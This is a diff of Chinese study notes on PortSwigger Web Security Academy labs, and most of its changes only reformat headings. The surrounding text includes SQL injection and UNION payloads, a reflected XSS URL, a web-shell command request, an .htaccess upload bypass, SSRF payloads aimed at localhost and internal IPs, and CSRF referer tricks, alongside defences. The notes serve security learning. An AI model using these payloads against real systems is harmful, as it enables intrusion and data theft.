@@ -1,10 +1,11 @@
 ---
-title: PortSwigger_BurpSuite
-permalink: /PortSwigger_BurpSuite
+title: PortSwigger_Client_Side
+permalink: /PortSwigger_Client_Side
 category: 信息安全
 tag:
   - 信息安全
   - 渗透测试
+  - PortSwigger
 author: xmy
 
 ---
@@ -15,11 +16,15 @@ PortSwigger 网站和 BurpSuite 实验记录，网站地址：https://portswigge
 
 
 
+HTTP Host Header 相关：https://portswigger.net/web-security/host-header#what-is-the-http-host-header
 
 
 
 
-## SQL Injection
+
+
+
+# SQL Injection
 
 在前端输入框、组件中，可以输入参数的地方，通过关键字、注释符等，导致后端处理 SQL 时执行非正常逻辑，从而泄露数据、被篡改数据等。  
 
@@ -29,7 +34,7 @@ PortSwigger 网站和 BurpSuite 实验记录，网站地址：https://portswigge
 
 Portswigger Academy 相关示例：
 
-### retrieving hidden data 隐藏数据
+## retrieving hidden data 隐藏数据
 
 
 
@@ -60,7 +65,7 @@ SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
 
 
 
-### subverting application logic 破坏逻辑
+## subverting application logic 破坏逻辑
 
 示例是用户名密码登录框，输入用户名 wiener 密码 bluecheese  
 
@@ -78,7 +83,7 @@ SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 
 
 
-### UNION attacks 联合注入
+## UNION attacks 联合注入
 
 数据库关键字 UNION 可以实现联合查询，例如查询两个表中数据
 
@@ -86,7 +91,7 @@ SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 SELECT a, b FROM table1 UNION SELECT c, d FROM table2
 ```
 
-#### 探测方法：order by、NULL 值等
+### 探测方法：order by、NULL 值等
 
 通过一些手段可以探测到字段数量
 
@@ -132,7 +137,7 @@ All queries combined using a UNION, INTERSECT or EXCEPT operator must have an eq
 
 
 
-#### 探测字段类型
+### 探测字段类型
 
 确认了字段数量后，可以使用占位符去探测出一些字段的数据类型，这里将 'a' 逐个替换掉每个字段，来观察返回的值或者错误：
 
@@ -159,7 +164,7 @@ Conversion failed when converting the varchar value 'a' to data type int.
 
 
 
-#### 联合查询其它 table
+### 联合查询其它 table
 
 实验中假设已知 users 表有 username、password 字段，尝试通过页面注入 union select 查询该表数据：
 
@@ -173,7 +178,7 @@ https://xxxxxxxxxxxxx.web-security-academy.net/filter?category=Pets%27+union+sel
 
 
 
-#### 探测数据库信息
+### 探测数据库信息
 
 可以利用上面方法和数据库的一些常用 table、关键字 来查询数据库的信息，包括版本、表名称、表结构等等。  
 
@@ -187,7 +192,7 @@ https://xxxxxxxxxxxxx.web-security-academy.net/filter?category=Pets%27+union+sel
 
 
 
-#### 通过 content、表结构检索出用户信息实验
+### 通过 content、表结构检索出用户信息实验
 
 
 
@@ -231,7 +236,7 @@ https://sssssssssssssssss99.web-security-academy.net/filter?category=Pets%27+uni
 
 
 
-#### 通过单字段检索多个值
+### 通过单字段检索多个值
 
 数据库有一些字符串拼接的语法可以使用，例如 oracle ：
 
@@ -273,13 +278,13 @@ https://xxxxxxxxxxxxxxxxxx.web-security-academy.net/filter?category=Pets%27+unio
 
 
 
-### Blind SQL Injection 盲注
+## Blind SQL Injection 盲注
 
 盲注是指应用包含 SQL Injection 漏洞，但是 HTTP 返回的内容不包含相关 SQL 结果。UNION attacks 在这种情况下很难有效果。  
 
 
 
-#### conditional responses
+conditional responses
 
 portswigger示例：
 
@@ -412,7 +417,7 @@ upc378pc9riff1ahiyya
 
 
 
-#### Error-based SQL injection
+### Error-based SQL injection
 
 能够触发错误被利用的分为两种类型：
 
@@ -565,7 +570,7 @@ ERROR: invalid input syntax for type integer: "igi17bo6xv4ab8gly0fw"
 
 
 
-#### triggering time delays
+### triggering time delays
 
 当服务端正确处理错误，就无法利用上面错误响应及报错信息的技术。此时还可以尝试注入延时来判断或验证一些信息：  
 
@@ -632,7 +637,7 @@ w9ch9omgsn2lib9hkpf2
 
 
 
-#### Out-of-band (OAST) 
+### Out-of-band (OAST) 
 
 有些应用可能采用异步执行 SQL 的架构，对外的服务的线程仅接收请求，转发给其它线程执行 SQL。这种场景下前面的注入技术都不能生效，无法获得反馈。  
 
@@ -688,7 +693,7 @@ w9ch9omgsn2lib9hkpf2
 
 
 
-#### Preventing blind SQL Injection
+### Preventing blind SQL Injection
 
 和预防普通 SQL 注入一样，要小心处理参数化查询的语句，确保用户输入的内容不能拼接、构造出超预期的 SQL 查询。  
 
@@ -717,7 +722,7 @@ ResultSet resultSet = statement.executeQuery();
 
 
 
-### Second-order SQL injection
+## Second-order SQL injection
 
 一级注入是指发生在应用程序通过 HTTP request 接收处理用户请求的时候。  
 
@@ -731,7 +736,7 @@ ResultSet resultSet = statement.executeQuery();
 
 
 
-### SQL injection in different contexts
+## SQL injection in different contexts
 
 在不同场景下可以通过不同方法构造 SQL 注入。例如有些网站使用 xml、json 之类的形式收集数据，并且放置了 WAF 之类的防御设施，可以通过一些特殊编码规则来绕过防火墙检测来注入语句。    
 
@@ -776,9 +781,9 @@ XML 注入实验：
 
 
 
-## Authentication vulnerabilities 认证漏洞
+# Authentication vulnerabilities 认证漏洞
 
-### 认证类型
+## 认证类型
 
 主要有3类：
 
@@ -788,7 +793,7 @@ XML 注入实验：
 
 
 
-### Authentication 和 Authorization  的区别
+## Authentication 和 Authorization  的区别
 
 认证和鉴权：
 
@@ -800,7 +805,7 @@ XML 注入实验：
 
 
 
-### 认证漏洞产生的原因
+## 认证漏洞产生的原因
 
 主要有2点：
 
@@ -809,7 +814,7 @@ XML 注入实验：
 
 
 
-### 基于密码认证的脆弱点
+## 基于密码认证的脆弱点
 
 
 
@@ -835,7 +840,7 @@ XML 注入实验：
 
 
 
-### 基于多因子认证的脆弱点
+## 基于多因子认证的脆弱点
 
 多因子主要基于前面所说三种类型，大多数网站或者应用对于生物特征(something you are)难以验证，因此很多时候都采用双因子(something you know、something you have) 2FA 认证，要求同时提供两种认证，常见的有密码+验证码（邮箱、短信、认证APP验证码）。但和其他认证类似，安全程度取决于认证的实现。  
 
@@ -843,13 +848,13 @@ XML 注入实验：
 
 有一些常见的漏洞：
 
-#### 绕过校验
+### 绕过校验
 
 密码认证通过后，将用户引导至验证码提交表单页面，但用户状态已经变为登录，此时通过手动输入 url 就可以访问相关页面。
 
 
 
-#### 认证逻辑漏洞
+### 认证逻辑漏洞
 
 示例
 
@@ -898,7 +903,7 @@ XML 注入实验：
 
   
 
-#### 基于 token 的暴力破解
+### 基于 token 的暴力破解
 
 示例：
 
@@ -936,11 +941,11 @@ XML 注入实验：
 
 
 
-### 其它认证机制的脆弱点
+## 其它认证机制的脆弱点
 
 
 
-#### 保持登录
+### 保持登录
 
 有一种很常见的功能是保持登录，页面常见的形式是标识着“记住我”、“保持登录”之类的勾选框。通常是生成一个持久化的 cookie ，该 cookie 作为 token 或其一部分传给服务器以通过登录认证环节，这个 cookie 最佳实践应当是有随机性难以猜测出来的。  
 
@@ -954,7 +959,7 @@ XML 注入实验：
 
 
 
-#### 重置密码
+### 重置密码
 
 实际应用中用户可能会忘记密码，因此通常会提供一种重置密码的功能，实现有多种方式，安全措施及风险也不相同。  
 
@@ -968,7 +973,7 @@ XML 注入实验：
 
 
 
-#### 修改密码
+### 修改密码
 
 通常修改密码功能的流程和登录类似，因此也存在类似风险。如果允许未登录情况下访问该功能页面，也会存在暴力破解密码的漏洞。  
 
@@ -982,7 +987,7 @@ XML 注入实验：
 
 
 
-### OAuth 认证的脆弱点
+## OAuth 认证的脆弱点
 
 有一个专题，暂时先跳过
 https://portswigger.net/web-security/oauth
@@ -991,7 +996,7 @@ https://portswigger.net/web-security/oauth
 
 
 
-### 增强认证安全
+## 增强认证安全
 
 虽然无法面面俱到，仍有一些原则可以帮助我们提高安全性：
 
@@ -1009,11 +1014,11 @@ https://portswigger.net/web-security/oauth
 
 
 
-## XSS(Cross-site script) 跨站脚本攻击
+# XSS(Cross-site script) 跨站脚本攻击
 
 
 
-### 概念
+## 概念
 
 XSS 是一种 web 安全漏洞，攻击者篡改用户与存在漏洞的应用之间的交互，执行用户能够进行的操作和访问用户所有数据。主要运作原理是操纵存在漏洞的网站应用向用户返回恶意 JavaScript 代码，当代码在用户浏览器中执行，攻击者就掌握了其与服务器之间的交互。  
 
@@ -1033,7 +1038,7 @@ Cheat sheet：https://portswigger.net/web-security/cross-site-scripting/cheat-sh
 
 
 
-### 反射型 XSS
+## 反射型 XSS
 
 最直接的类型形式。当应用接收到 HTTP 请求，没有经过安全处理，直接将数据包含到 response 中时，就会导致漏洞。
 
@@ -1059,7 +1064,7 @@ https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</scr
 
 
 
-### 存储型 XSS
+## 存储型 XSS
 
 又叫持久化 XSS 或者二级 XSS。当应用程序接收到用户提交的 HTTP数据并存储，作为后续流程中的数据进行返回，就属于这种类型。常见的有 BLOG 评论发表、用户昵称展示、订单展示信息。  
 
@@ -1081,7 +1086,7 @@ https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</scr
 
 
 
-### 基于 DOM 的 XSS
+## 基于 DOM 的 XSS
 
 应用通过一些不安全的方式处理用户提交的数据，并将数据写回到 DOM 中。
 
@@ -1163,7 +1168,7 @@ $.parseHTML()
 
 
 
-### 常见用途
+## 常见用途
 
 * 冒充用户
 * 执行用户有权限执行的动作
@@ -1178,7 +1183,7 @@ $.parseHTML()
 
 
 
-### exploit
+## exploit
 
 三种流行的利用 XSS 的事件类型：
 
@@ -1371,7 +1376,7 @@ $.parseHTML()
 
 
 
-### XSS contexts
+## XSS contexts
 
 常见的 XSS context 有：
 
@@ -1457,7 +1462,7 @@ $.parseHTML()
 
 
 
-### Dangling markup injection
+## Dangling markup injection
 
 悬浮标记注入是一般常规 XSS 被拦截或禁止后的一种手法，常用于跨域窃取信息。  
 
@@ -1537,7 +1542,7 @@ exploit 服务器可以看到通过 hangling markup 携带信息的请求：
 
 
 
-### Content Security Policy (CSP)
+## Content Security Policy (CSP)
 
 CSP 这种浏览器安全机制是为了减少 XSS 、dangling markup 、点击劫持之类的攻击。  
 
@@ -1616,11 +1621,11 @@ Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'
 
 
 
-### 预防 XSS 攻击
+## 预防 XSS 攻击
 
 
 
-#### 输出编码
+### 输出编码
 
 编码将要输出到客户端的数据内容。  
 
@@ -1654,7 +1659,7 @@ onclick="func('<?php echo $user_input; ?>')"
 
 
 
-#### 验证输入
+### 验证输入
 
 提交的数据要严格检查
 
@@ -1668,7 +1673,7 @@ onclick="func('<?php echo $user_input; ?>')"
 
 
 
-#### 允许"安全的" HTML
+### 允许"安全的" HTML
 
 * 尽量避免让用户提交 HTML 
 * 但在一些业务场景下有此类需求，传统做法是使用白名单，只允许部分标签，但由于各个浏览器解析方式的差异、Mutation XSS 之类的漏洞，人工写正则之类的过滤无法做到绝对安全
@@ -1678,7 +1683,7 @@ onclick="func('<?php echo $user_input; ?>')"
 
 
 
-#### 使用模板引擎
+### 使用模板引擎
 
 * 现在大多数网站使用模板引擎，例如 Twig、Freemarker，这些模板引擎有各自实现的 Escaping System(消毒系统)，将输入的数据做转义。
 * Jinjia、React 之类的框架，默认会开启消毒模式，这样能避免大多数 XSS 。
@@ -1692,7 +1697,7 @@ onclick="func('<?php echo $user_input; ?>')"
 
 
 
-#### In PHP
+### In PHP
 
 PHP 有一个内建的方法 `htmlentities` ，有 3 个参数：
 
@@ -1758,7 +1763,7 @@ function jsEscape($str) {
 
 
 
-#### In JavaScript
+### In JavaScript
 
 在 JS 中要输出 HTML 字符串，编码为 HTML 格式：
 
@@ -1800,7 +1805,7 @@ function jsEscape(str){
 
 
 
-#### In jQuery
+### In jQuery
 
 `$()` 方法在旧版本中检测到字符串以 `#` 开头就会当成 HTML 渲染，存在被利用的漏洞，新版本已做了修复。也可以参考上面 JavaScript 的 jsEscape 方法进行转义避免漏洞。
 
@@ -1808,7 +1813,7 @@ function jsEscape(str){
 
 
 
-#### Using CSP
+### Using CSP
 
 * CSP 是最后一道防御，假设前面的防御都失效或者被攻破，如果 CSP 设置的比较严格，会限制攻击者能做的行为。  
 
@@ -1838,11 +1843,11 @@ function jsEscape(str){
 
 
 
-## CSRF(Cross-site request forgery) 跨站请求伪造
+# CSRF(Cross-site request forgery) 跨站请求伪造
 
 
 
-### 影响及条件
+## 影响及条件
 
 CSRF 是一种 Web 安全漏洞，攻击者诱导用户执行他们无意执行的操作，允许攻击者绕过或部分绕过同源策略 SOP ，该策略是为了防止不同网站之间相互干扰。  
 
@@ -1899,7 +1904,7 @@ email=wiener@normal-user.com
 
 
 
-### 构造和传递 CSRF exploit
+## 构造和传递 CSRF exploit
 
 典型的方法是通过 email、社交软件传递 http链接，诱骗用户访问恶意构造的钓鱼网站，或者在一些流行的网站评论区、帖子上发表链接等待用户访问。有一些简单的 CSRF expolit 利用 GET 请求可以完全包含在一个单一的 URL 请求中，例如假设一个网站可以通过 GET 请求修改邮箱，一个自包含的攻击可能如下：
 
@@ -1921,7 +1926,7 @@ XSS 和 CSRF 的区别：
 
 
 
-### 防御 CSRF 的机制
+## 防御 CSRF 的机制
 
 * CSRF Token ：服务器生成，与客户端共享且唯一的值，客户端提交敏感操作时携带 token，服务器检查是否有正确凭证
 * SameSite cookies：请求来自其它网站时，浏览器决定是否携带某网站的 cookie
@@ -1933,7 +1938,7 @@ XSS 和 CSRF 的区别：
 
 
 
-### CSRF Token
+## CSRF Token
 
 一个 CSRF token 通常是由服务端应用生成的：唯一、机密、不可预测的一个值，共享给客户端。当客户端触发一个敏感动作，例如提交表单时，应该携带正确的 token，否则服务端拒绝该请求。  
 
@@ -1995,13 +2000,13 @@ csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
 
 
 
-### SameSite cookies
+## SameSite cookies
 
 SameSite 是一种浏览器安全机制，用于确定来自其它网站的请求中，何时包含一个 cookie。SameSite Cookie 主要为跨站访问提供部分保护，用于 CSRF、Cross-site leak、CROS 等。  
 
 
 
-#### Context 
+### Context 
 
 在 SameSite context 中，Site 被定义为： TLD 顶级域（例如 `.com`、`.net` 等）加上一个额外层级，通常也被称为 TLD+1（例如 `example.com`）。URL协议（Scheme）的不同通常也被视为不同站点。还有一类称为 eTLD （顶级有效域）的域名，例如 `.com.cn`、`.co.uk` 这种在实践中通常也被视为同站点，eTLD 域名的计算机制参考**公共后缀列表（Public Suffix List，PSL）**。  
 
@@ -2009,7 +2014,7 @@ SameSite 是一种浏览器安全机制，用于确定来自其它网站的请�
 
 
 
-#### Site VS Origin
+### Site VS Origin
 
 这两个术语的主要区别在于范围(Scope)，它们密切相关但不能互换，混为一谈可能会有安全隐患。  
 
@@ -2035,7 +2040,7 @@ SameSite 是一种浏览器安全机制，用于确定来自其它网站的请�
 
 
 
-#### 工作机制
+### 工作机制
 
 在 SameSite 安全机制出现之前，浏览器会在每个 request 中携带该域名的 Cookie，即使请求是由完全不相关的第三方网站发起。SameSite 的出现是为了让网站开发者和浏览器控制哪些跨站请求（ Cross-Site）可以携带特定的 Cookie。这样可以降低收到 CSRF 攻击的风险，因为 CSRF 类的攻击通常是诱导用户触发一些有害的操作，需要携带受害者的会话 Cookie，如果浏览器限制了携带 Cookie，攻击就会失效。   
 
@@ -2049,7 +2054,7 @@ SameSite 是一种浏览器安全机制，用于确定来自其它网站的请�
 
 
 
-#### 绕过 SameSite
+### 绕过 SameSite
 
 在一些场景下即使配置了 SameSite 也存在漏洞可以绕过：
 
@@ -2174,7 +2179,7 @@ portswigger 兄弟域名实验：有一个带聊天室的 blog ，聊天室使�
 
 
 
-### Referer-based 
+## Referer-based 
 
 有些应用使用 HTTP header 中的  referer 字段来尝试防御 CSRF 攻击，但这种方法效果不好，通常容易被绕过。  
 
@@ -2237,7 +2242,7 @@ http://vulnerable-website.com.attacker-website.com/csrf
 
 
 
-### 如何预防 CSRF
+## 如何预防 CSRF
 
 主要还是上面提到的 CSRF-Token 和 SameSite 策略。  
 
@@ -2295,7 +2300,7 @@ CSRF token 生成后存放在服务端的用户 session 数据中，后续收到
 
 
 
-## Path traversal 目录遍历
+# Path traversal 目录遍历
 
 Path traversal 又称 Directory traversal，有翻译为目录遍历、路径穿越、路径遍历，会导致攻击者读取服务器上的任意数据，可能包括：代码和数据、后端凭证、系统敏感文件。一些场景中还可以写入文件，导致修改应用数据或者属性，最终拿到服务器权限。  
 
@@ -2318,11 +2323,11 @@ Path traversal 又称 Directory traversal，有翻译为目录遍历、路径穿
 
 
 
-## File Upload 文件上传
+# File Upload 文件上传
 
 当一个网站应用允许用户上传到文件系统中，但没有足够的检查手段，就会导致恶意文件上传漏洞，攻击者可能会利用该漏洞上传服务端脚本开启远程代码执行。  
 
-### 影响
+## 影响
 
 文件上传漏洞的影响一般取决于这些因素：
 
@@ -2337,13 +2342,13 @@ Path traversal 又称 Directory traversal，有翻译为目录遍历、路径穿
 
 
 
-### 产生原因
+## 产生原因
 
 
 
 
 
-### 简单利用示例
+## 简单利用示例
 
 最坏的场景下，文件上传功能没有做任何限制，导致可以上传可执行代码类型的文件。  
 
@@ -2354,9 +2359,9 @@ Path traversal 又称 Directory traversal，有翻译为目录遍历、路径穿
 
 
 
-### 常见漏洞
+## 常见漏洞
 
-#### 文件类型校验缺陷
+### 文件类型校验缺陷
 
 很多场景下上传文件的 html 是使用 `POST` 方法上传 `application/x-www-form-urlencoded` 上下文类型（content type），对于图片、PDF 等二进制文件，通常使用 `multipart/form-data` 上下文类型。  
 
@@ -2392,7 +2397,7 @@ POST /images HTTP/1.1
 
 
 
-#### 阻止文件执行
+### 阻止文件执行
 
 作为一种预防手段，服务器可以配置仅执行 MIME 类型的脚本，其他类型文件返回错误或者直接将内容以消息形式返回。
 
@@ -2419,11 +2424,11 @@ GET /static/exploit.php?command=id HTTP/1.1
 
 
 
-#### 文件类型黑名单设置不充分
+### 文件类型黑名单设置不充分
 
 
 
-##### 覆盖服务器配置
+#### 覆盖服务器配置
 
 例如假设 apache 服务器允许上传 `.htaccess` 类型的文件，攻击者上传了如下内容：
 
@@ -2441,7 +2446,7 @@ AddType application/x-httpd-php .jpg
 
 
 
-##### 混淆文件扩展名
+#### 混淆文件扩展名
 
 即使黑名单设置的很详尽，也可能通过混淆技术被绕过。简单的示例：假设黑名单代码是区分大小写的，且未能检查出 `exploit.pHp` 是 `.php` 文件，就会被绕过。还有很多种类型：
 
@@ -2456,7 +2461,7 @@ AddType application/x-httpd-php .jpg
 
 
 
-#### 文件内容验证缺陷
+### 文件内容验证缺陷
 
 一些对安全要求较高的应用会校验文件内容，例如 jpg 等图片文件有属性：尺寸大小，而如果攻击者上传 .php 之类的文件伪装则不存在此类属性从而被拒绝。但可以通过修改文件元属性等方式绕过检测。  
 
@@ -2470,7 +2475,7 @@ AddType application/x-httpd-php .jpg
 
 
 
-#### 文件上传条件竞争
+### 文件上传条件竞争
 
 现代 web 框架对上面几类攻击都有了更强的防御能力，通常会将文件上传到一个临时目录或者沙箱中，然后随机化文件名并加以验证，确认安全后再进行转移到目标位置。  
 
@@ -2552,7 +2557,7 @@ def handleResponse(req, interesting):
 
 
 
-### 无远程代码执行的文件上传漏洞
+## 无远程代码执行的文件上传漏洞
 
 前面都是可以上传远程执行代码相关的漏洞，还有一些虽然不能触发远程代码执行漏洞，但也可以通过其它方式被利用：
 
@@ -2563,7 +2568,7 @@ def handleResponse(req, interesting):
 
 
 
-### 利用 PUT 上传
+## 利用 PUT 上传
 
 有些 web 服务器或者框架默认配置支持了 PUT 请求，这样即使没有 web 页面用于上传文件，也会存在潜在的通过 PUT 请求上传文件漏洞。
 
@@ -2582,7 +2587,7 @@ Content-Length: 49
 
 
 
-### 预防文件上传漏洞
+## 预防文件上传漏洞
 
 文件上传相关最佳实践：
 
@@ -2598,11 +2603,11 @@ Content-Length: 49
 
 
 
-## Access Control/ IDOR 访问控制失效
+# Access Control/ IDOR 访问控制失效
 
 
 
-### 概念
+## 概念
 
 访问控制是约束用户可以执行被授权的动作、可访问授权的资源。
 
@@ -2612,19 +2617,20 @@ Content-Length: 49
 
 
 
-#### Vertical access controls 垂直访问控制
+### Vertical access controls 垂直访问控制
 
 不同级别角色用户的权限，例如普通用户、管理员、超级管理员。
 
 
 
-#### Horizontal access controls 水平访问控制
+
+### Horizontal access controls 水平访问控制
 
 不同用户的权限，例如A用户、B用户，只能访问属于自己的资源。
 
 
 
-#### Context-dependent access controls 依赖上下文的控制
+### Context-dependent access controls 依赖上下文的控制
 
 依赖于上下文状态的访问控制，例如根据是否购买会员展示不同内容、购物车下单依赖商品库存状态等。
 
@@ -2632,9 +2638,9 @@ Content-Length: 49
 
 
 
-### 访问控制失效常见类型
+## 访问控制失效常见类型
 
-#### Vertical privilege escalation 垂直提权
+### Vertical privilege escalation 垂直提权
 
 如果用户能够获取或者访问到未授权的功能、资源，就属于垂直提权。  
 
@@ -2686,7 +2692,7 @@ Content-Length: 49
 
 
 
-#### Horizontal privilege escalation 水平提权
+### Horizontal privilege escalation 水平提权
 
 水平提权是指通过漏洞访问到不属于自身用户的资源。  
 
@@ -2700,13 +2706,13 @@ Content-Length: 49
 
 
 
-#### Horizontal to vertical privilege escalation 水平提权到垂直提权
+### Horizontal to vertical privilege escalation 水平提权到垂直提权
 
 如果通过水平提权获取到高等级用户的账户，例如管理员，就属于水平提权转变为垂直提权。  
 
 ​	
 
-#### Insecure Direct Object Reference(IDOR) 不安全对象引用
+### Insecure Direct Object Reference(IDOR) 不安全对象引用
 
 当应用通过用户的输入来直接访问对象时，就可能出现 IDOR 漏洞，曾经在 OWASP 2007 TOP Ten 列表。  
 
@@ -2717,7 +2723,7 @@ Content-Length: 49
 
 
 
-#### 多步骤处理漏洞
+### 多步骤处理漏洞
 
 很多网站的重要功能实现会被拆分为多个步骤，通常发生在：
 
@@ -2734,19 +2740,19 @@ Content-Length: 49
 
 
 
-#### 基于 referer 的访问控制
+### 基于 referer 的访问控制
 
 一些网站基于 `Referer` 头参数来判断是否有权限。例如对 `/admin/deleteUser` 发起一个请求，如果 `Referer` 是来自 `/admin` 则放行，这样就给攻击者留下了漏洞，通过控制 `Referer` 的值来绕过验证。  
 
 
 
-#### 基于地理位置的访问控制
+### 基于地理位置的访问控制
 
 根据不同国家、省市(州)的法律法规，有些应用会限制访问来源的地理位置，通常可以通过代理、VPN 等手段绕过。  
 
 
 
-### 预防
+## 预防
 
 
 
@@ -2760,11 +2766,11 @@ Content-Length: 49
 
 
 
-## Business logic 业务逻辑漏洞
+# Business logic 业务逻辑漏洞
 
 
 
-### 产生原因和影响
+## 产生原因和影响
 
 通常是设计和开发团队对用户和应用之间的交互做了有缺陷的假设，可能是验证输入不充分、逻辑不够严谨等。越复杂的系统越容易出现，当多个模块的设计者或开发人员对其它交互的组件理解不深，做出一些错误假设，无意之间就会引入严重逻辑缺陷。业务逻辑漏洞的影响和功能相关，可能很轻微，也可能很严重，例如认证、金融交易之类的漏洞通常容易产生严重影响。  
 
@@ -2805,13 +2811,13 @@ Content-Length: 49
 
 
 
-### 示例
+## 示例
 
-#### 过度信任客户端控制
+### 过度信任客户端控制
 
 参考 Authentication 中的多因子实验。
 
-#### 处理异常输入的缺陷
+### 处理异常输入的缺陷
 
 实验一：购物车没有对减去商品数量做剩余数量检查，当购物车中不存在该商品时仍处理请求，通过 burpsuite 拦截修改，利用 Repeat 发送多个减去商品的请求，使得购物车中商品数量出现了负值，再加上其它商品就可以凑出较小金额进行下单。
 
@@ -2831,7 +2837,7 @@ wienerpeterxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 
 
-#### 对用户行为的假设
+### 对用户行为的假设
 
 * Trusted users won't always remain trustworthy
   * 实验示例：根据用户邮箱后缀判断是否为内部用户，但未对注册成功的外部用户修改邮箱做校验，导致可以修改为内部邮箱，从而访问管理页面
@@ -2848,7 +2854,7 @@ wienerpeterxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 
 
-#### 特定领域缺陷
+### 特定领域缺陷
 
 示例实验一：反复利用不同优惠券减直到余额为零。
 
@@ -2862,7 +2868,7 @@ wienerpeterxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 
 
-#### 提供加密预言机
+### 提供加密预言机
 
 当用户可控的输入被加密，并且生成的密文以某种形式提供给用户。就可能出现危险的场景，被称为“encryption oracle(加密预言机)”（在密码学中，指一个能对任意输入返回加密结果的黑盒系统）。攻击者可以利用这个输入加密任意数据，当应用程序存在一个反向功能的可控输入，攻击者甚至能够解密其他数据识别结构。  
 
@@ -3052,7 +3058,7 @@ Cookie: notification=fSlDvCq01P/XdZzWu1ggQj0zcaR2/ILnCvXxptbx9xU=; stay-logged-i
 
 
 
-#### 邮件地址解析差异
+### 邮件地址解析差异
 
 参考：https://portswigger.net/research/splitting-the-email-atom
 
@@ -3087,7 +3093,7 @@ Q编码和utf7字符集：
 
 
 
-### 预防
+## 预防
 
 
 
@@ -3106,7 +3112,7 @@ Q编码和utf7字符集：
 
 
 
-## Server-side request forgery(SSRF) 服务端请求伪造
+# Server-side request forgery(SSRF) 服务端请求伪造
 
 服务端请求伪造漏洞是指攻击者可以通过服务器连接到非预期位置发起请求。可能连接到服务器所在基础设施内网，获取敏感数据，甚至某些场景下可以执行任意命令。  
 
@@ -3114,11 +3120,11 @@ Q编码和utf7字符集：
 
 
 
-### 常见攻击
+## 常见攻击
 
 
 
-#### 针对服务器本身
+### 针对服务器本身
 
 示例，一个购物程序向后端查询库存通过如下请求：
 
@@ -3152,7 +3158,7 @@ stockApi=http://localhost/admin
 
 
 
-#### 针对其它后端系统
+### 针对其它后端系统
 
 示例，内网管理系统为 http://192.168.0.68/admin ，允许来自局域网请求，攻击者就可以提交如下请求获取管理页面 ：
 
@@ -3168,11 +3174,11 @@ stockApi=http://192.168.0.68/admin
 
 
 
-### 绕过常见防御
+## 绕过常见防御
 
 有些常见预防 SSRF 的手段也可以被绕过。  
 
-#### 黑名单输入过滤
+### 黑名单输入过滤
 
 一些应用使用黑名单阻止来自 `127.0.0.1` 、 `localhost` 之类的请求，或者敏感 URLs，下列方法可以进行尝试绕过：
 
@@ -3183,7 +3189,7 @@ stockApi=http://192.168.0.68/admin
 
 
 
-#### 白名单输入过滤
+### 白名单输入过滤
 
 一些应用使用白名单，只允许匹配白名单中值的输入。但过滤器采用的算法不同，就会产生差异。URL 规范中包含的一些特性在实现或验证时会被忽视：
 
@@ -3218,7 +3224,7 @@ http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
 
 
 
-#### 重定向跳转
+### 重定向跳转
 
 一些应用中包含了重定向跳转，可能会被利用发起 SSRF，例如：`/product/nextProduct?currentProductId=6&path=http://evil-user.net` 跳转到 `http://evil-user.net`   
 
@@ -3236,19 +3242,19 @@ stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=htt
 
 
 
-### 盲 SSRF
+## 盲 SSRF
 
 当应用程序被诱导发起 SSRF，但 SSRF 的响应内容不会返回到客户端，就属于盲 SSRF。  
 
 盲 SSRF 通常的影响低于有响应的 SSRF，因为不能被利用检索数据，但有些情况下会被利用实现 RCE。  
 
-#### 发现
+### 发现
 
 发现和检查盲 SSRF 比较有效的方法是使用 OAST ，尝试对外发起连接请求。  
 
 在测试时有时会发现有对应 DNS 查询记录但没有后续请求，通常时因为应用程序尝试发起 HTTP 请求，主机发送了 DNS 查询，但后续 HTTP 被网络层过滤阻止了。很多时候基础设施层面允许 DNS 请求，但阻止 HTTP 请求。       
 
-#### 利用
+### 利用
 
 能够触发一个带外 HTTP 请求的盲 SSRF 通常没有太多可利用的路径，但有时可以被利用进行内网探测，批量发送已知漏洞的 Payload，如果这些 Payload 可以被利用也发起 OAST 带外请求，就会被进一步利用来确认内网中存在漏洞的服务器。  
 
@@ -3264,29 +3270,29 @@ stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=htt
 
 
 
-### 寻找隐藏攻击面
+## 寻找隐藏攻击面
 
 很多 SSRF 漏洞比较容易找到，因为应用程序正常请求的完整 URL、参数会被记录。有一些场景下会隐藏的比较深，较难定位。
 
-#### Partial URLs in request 请求中的部分URL
+### Partial URLs in request 请求中的部分URL
 
 有些应用将主机名或者 URL 路径的一部分放入请求参数，提交到后端服务。  
 
 
 
-#### URLs with data format 数据格式 中的 URL
+### URLs with data format 数据格式 中的 URL
 
 一些应用使用规定的格式传输数据。请求的 URL 包含在这些格式的数据文件中。常见的有 XML、JSON 等，此时就容易收到注入攻击，例如  XXE。 
 
 
 
-#### SSRF via Referer header
+### SSRF via Referer header
 
 一些应用出与跟踪、分析数据等原因会记录用户请求头中的 Referer 信息，如果分析软件会访问出现在该字段值的 URL，进一步记录站点内容等，就会被利用来 SSRF。  
 
 
 
-### Payload cheat sheet
+## Payload cheat sheet
 
 https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
 
@@ -3294,7 +3300,7 @@ https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
 
 
 
-## XML external entity(XXE) injection XML外部实体注入
+# XML external entity(XXE) injection XML外部实体注入
 
 
 
@@ -3306,13 +3312,13 @@ XML 外部实体是一种自定义的 XML实体，其定义的值是从声明它
 
 
 
-### XML entities
+## XML entities
 
 XML 全称是 "extensible markup language"，设计来存储或传输数据。如同 HTML，XML 使用标签和数据的树状结构，但不像HTML那样包含预定义标签，因此 tag 可以包含名称用来描述数据。早期 web 历史中很流行，但如今更多的应用使用 JSON 格式。  
 
 
 
-#### 内置实体
+### 内置实体
 
